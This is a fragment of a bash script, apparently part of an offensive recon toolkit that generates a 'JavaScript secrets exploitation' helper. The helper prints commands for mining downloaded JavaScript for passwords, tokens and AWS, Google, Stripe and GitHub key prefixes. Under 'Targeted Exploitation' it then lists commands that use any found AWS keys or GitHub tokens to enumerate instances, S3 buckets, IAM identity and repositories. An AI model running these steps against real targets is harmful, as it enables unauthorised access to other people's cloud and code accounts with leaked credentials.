echo "   cat js_analysis_findings.json | jq -r '.api_endpoints[].endpoint' | httpx -silent"
echo ""
echo "   # Extract source maps"
echo "   cat js_analysis_findings.json | jq -r '.source_maps[].sourcemap' | wget -i -"

echo ""
echo "3. 🔍 Deep Secret Mining:"
echo "   # Search for more secrets in downloaded JS"
echo "   grep -r 'config\|secret\|key\|token\|password' js_content/"
echo "   grep -r 'AKIA\|AIza\|sk_\|ghp_' js_content/"

echo ""
echo "4. 🎯 Targeted Exploitation:"
echo "   # If valid AWS keys found"
echo "   aws ec2 describe-instances"
echo "   aws s3api list-buckets"
echo "   aws iam get-user"
echo ""
echo "   # If valid GitHub tokens found"
echo "   curl -H 'Authorization: token TOKEN' https://api.github.com/user/repos"
echo "   curl -H 'Authorization: token TOKEN' https://api.github.com/orgs/ORG/repos"

echo "✅ Use these commands with discovered valid API keys!"
EOF

chmod +x js_secrets_exploitation.sh

echo "🎯 Elite JavaScript Secrets & API Keys extraction toolkit ready!"
echo "📁 All results saved in: $TARGET/js_secrets/"